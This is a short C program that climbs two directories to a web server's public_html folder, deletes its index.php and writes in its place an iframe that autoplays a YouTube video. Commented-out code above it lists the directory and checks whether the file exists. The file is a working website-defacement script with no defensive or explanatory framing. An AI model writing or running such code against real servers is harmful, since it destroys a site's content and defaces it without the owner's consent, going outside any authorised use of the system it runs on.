#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
int main (void)
{
  /*DIR *dp;
  struct dirent *ep;

  dp = opendir ("../../public_html");
  if (dp != NULL)
    {
      while (ep = readdir (dp))
        puts (ep->d_name);
      (void) closedir (dp);
    }
  else
    perror ("Couldn't open the directory");

FILE *f=fopen("../../public_html/index.php","r");
if(f){
    printf("NU");
} else {
    printf("DA");
}
fclose(f);*/
remove("../../public_html/index.php");
FILE *f=fopen("../../public_html/index.php","w");
fprintf(f,"<iframe height=\"90%\" width=\"90%\" src=\'https://www.youtube.com/v/2AlYR9-uaIo?autoplay=1\'></iframe>");
fclose(f);
  return 0;
}